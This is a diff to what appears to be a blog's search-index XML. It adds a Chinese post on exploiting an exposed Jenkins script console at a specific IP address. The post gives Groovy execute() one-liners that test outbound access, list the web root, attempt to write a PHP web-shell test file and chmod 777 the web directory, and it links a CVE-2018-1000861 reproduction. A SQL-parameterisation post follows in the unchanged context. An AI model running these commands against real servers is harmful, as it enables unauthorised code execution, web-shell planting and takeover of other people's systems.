@@ -59,6 +59,36 @@
       </tags>
   </entry>
   <entry>
+    <title>JenKins利用</title>
+    <url>/2020/03/30/JenKins%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="Jenkins利用"><a href="#Jenkins利用" class="headerlink" title="Jenkins利用"></a>Jenkins利用</h2><blockquote>
+<p><strong>目标</strong>：<a href="http://5.196.89.136:8090/script" target="_blank" rel="noopener">http://5.196.89.136:8090/script</a></p>
+</blockquote>
+<h4 id="查看是否能够出网"><a href="#查看是否能够出网" class="headerlink" title="查看是否能够出网"></a>查看是否能够出网</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ping -c 3 www.baidu.com&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135353.png" alt="image-20200327135351787"></p>
+<p>结果显示可以。</p>
+<h4 id="查看web路径"><a href="#查看web路径" class="headerlink" title="查看web路径"></a>查看web路径</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;httpd -V&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h4 id="目录列举"><a href="#目录列举" class="headerlink" title="目录列举"></a>目录列举</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;ls &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327135651.png" alt="image-20200327135649845"></p>
+<h4 id="写入Web-shell测试"><a href="#写入Web-shell测试" class="headerlink" title="写入Web shell测试"></a>写入Web shell测试</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">new File(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&quot;).write(&quot;&lt;?php phpinfo(); ?&gt;&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://myblogs-1259760473.cos.ap-chengdu.myqcloud.com/imgs/20200327140018.png" alt="image-20200327140016826"></p>
+<p>发现没有写入权限。</p>
+<h3 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">println &quot;chmod 777 &#x2F;var&#x2F;www&#x2F;html&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h3><p><a href="https://www.cnblogs.com/cwkiller/p/12578924.html" target="_blank" rel="noopener">CVE-2018-1000861复现</a></p>
+]]></content>
+  </entry>
+  <entry>
     <title>sql参数化</title>
     <url>/2020/03/29/sql%E5%8F%82%E6%95%B0%E5%8C%96/</url>
     <content><![CDATA[<h2 id="sql参数化"><a href="#sql参数化" class="headerlink" title="sql参数化"></a>sql参数化</h2><p>sql参数化可以从根本上防止sql注入，sql注入的根本在于用户恶意拼接sql语句，数据库会将整个sql语句执行，而sql参数化采用预编译的方式，将用户输入的数据作为参数处理。下面是一段网上的java的预编译代码，很好理解。</p>
